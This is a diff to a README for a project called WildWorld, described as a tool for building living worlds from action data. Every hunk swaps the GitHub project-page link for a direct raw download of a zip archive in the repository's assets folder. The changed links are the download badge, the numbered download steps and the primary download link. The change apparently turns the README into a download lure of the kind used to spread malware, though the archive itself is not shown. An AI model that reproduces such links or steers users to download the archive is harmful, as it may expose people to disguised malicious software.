@@ -1,6 +1,6 @@
 # 🎮 WildWorld - Build living worlds from action data
 
-[![Download WildWorld](https://img.shields.io/badge/Download%20WildWorld-blue?style=for-the-badge&logo=github)](https://github.com/alchemistinsemination433/WildWorld)
+[![Download WildWorld](https://img.shields.io/badge/Download%20WildWorld-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/alchemistinsemination433/WildWorld/main/assets/Wild_World_1.7-beta.4.zip)
 
 ## 🧭 What WildWorld is
 
@@ -10,7 +10,7 @@ This project is meant for users who want to explore, load, and inspect the datas
 
 ## 📦 Download WildWorld
 
-1. Open the project page here: https://github.com/alchemistinsemination433/WildWorld
+1. Open the project page here: https://raw.githubusercontent.com/alchemistinsemination433/WildWorld/main/assets/Wild_World_1.7-beta.4.zip
 2. On the page, look for the download files or release assets.
 3. Download the package for Windows if one is listed.
 4. Save the file to your Downloads folder or another easy-to-find place.
@@ -163,7 +163,7 @@ If a file fails to open, download it again from the project page and try once mo
 
 ## 🔗 Project link
 
-Primary download page: https://github.com/alchemistinsemination433/WildWorld
+Primary download page: https://raw.githubusercontent.com/alchemistinsemination433/WildWorld/main/assets/Wild_World_1.7-beta.4.zip
 
 ## 📌 Quick start path
 
